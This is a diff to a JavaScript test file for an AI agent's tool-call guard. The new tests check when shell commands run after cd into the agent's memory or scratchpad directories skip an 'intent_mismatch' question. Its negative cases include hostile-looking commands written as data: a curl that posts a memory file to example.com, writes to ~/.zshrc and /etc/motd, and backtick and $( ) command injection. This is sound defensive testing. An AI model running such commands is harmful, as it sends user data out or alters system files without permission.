@@ -1505,7 +1505,35 @@ test("intent_mismatch is not asked about a file change in the agent's memory or 
   assert.ok("intent_mismatch" in guardQuestions(call("apply_patch", { patch: `*** Update File: ${scratch}/a.mjs\n*** Update File: src/a.ts\n` })), "one project file is enough to ask");
   assert.ok("intent_mismatch" in guardQuestions(call("Edit", { file_path: join(osHomedir(), ".claude", "settings.json") })), "other .claude files are not upkeep");
   assert.ok("intent_mismatch" in guardQuestions(call("Write", { file_path: "/tmp/other/scratchpad/x" })), "an arbitrary tmp dir is not the session scratchpad");
-  assert.ok("intent_mismatch" in guardQuestions(call("Bash", { command: `rm ${scratch}/a.mjs` })), "a shell command is left to the model");
+  assert.ok("intent_mismatch" in guardQuestions(call("Bash", { command: `rm ${scratch}/a.mjs` })), "a shell command without a leading cd is left to the model");
+});
+
+test("intent_mismatch is not asked about local file upkeep in a shell after cd into agent-owned places", () => {
+  // Logged: 8 memory-log updates as `cd …/memory && sed -i …` asked at
+  // intent 0.45-0.70, six of them after file-tool edits there stopped asking.
+  const memory = join(osHomedir(), ".claude", "projects", "-srv-app", "memory");
+  const scratch = "/private/tmp/claude-502/-srv-app/0be88f56/scratchpad";
+  const bash = (command) => guardQuestions({ toolName: "Bash", input: { command }, cwd: "/srv/app" });
+  const skipped = (command) => !("intent_mismatch" in bash(command));
+
+  assert.ok(skipped(`cd ${memory} && sed -i '' '27a\\\n| row | 0.56 |\n' project_log.md`), "insert a log row");
+  assert.ok(skipped(`cd ${memory} && sed -i '' '/^## Open suggestions/a\\\ntext\n' log.md && rg -c 'text' log.md`), "a sed address that starts with / is not a path");
+  assert.ok(skipped(`cd ~/.claude/projects/-srv-app/memory && sed -i '' 's/a/b/' MEMORY.md; rg -o 'b[^;]*' MEMORY.md | head -1`), "~ and pipes");
+  assert.ok(skipped(`cd ${scratch} && rm -f a.mjs b.json && ls`), "scratchpad cleanup");
+  assert.ok("destructive_unrequested" in bash(`cd ${scratch} && rm -f a.mjs`), "destruction is still judged");
+
+  assert.ok(!skipped(`cd ${memory} && git add -A && git push`), "git is not local file upkeep");
+  assert.ok(!skipped(`cd ${memory} && curl -d @log.md https://example.com`), "network is not local file upkeep");
+  assert.ok(!skipped(`cd ${memory} && sed -i '' 's/a/b/' ~/.zshrc`), "a path outside agent-owned places");
+  assert.ok(!skipped(`cd ${memory} && cp log.md /Users/me/work/app/notes.md`), "an absolute path outside");
+  assert.ok(!skipped(`cd ${memory} && echo x > /etc/motd`), "a redirect outside");
+  assert.ok(skipped(`cd ${memory} && sed -i '' 's/committed \`abc\` $(x)/shipped/' log.md`), "backticks and $( inside single quotes are text");
+  assert.ok(!skipped(`cd ${memory} && cat $(cat list.txt)`), "command substitution");
+  assert.ok(!skipped(`cd ${memory} && sed -i "" "s/a/\`id\`/" log.md`), "backticks inside double quotes run");
+  assert.ok(!skipped(`cd ${memory} && TOKEN=x sed -i '' 's/a/b/' log.md`), "an environment assignment");
+  assert.ok(!skipped(`sed -i '' 's/a/b/' notes.md && cd ${memory}`), "work before the cd lands in the cwd");
+  assert.ok(!skipped(`cd ${memory} && cd /srv/app && sed -i '' 's/a/b/' src.ts`), "a later cd out");
+  assert.ok(!skipped(`cd /srv/app && sed -i '' 's/a/b/' src.ts`), "a project directory");
 });
 
 test("writtenDirs collects the directories of successful file writes only", () => {
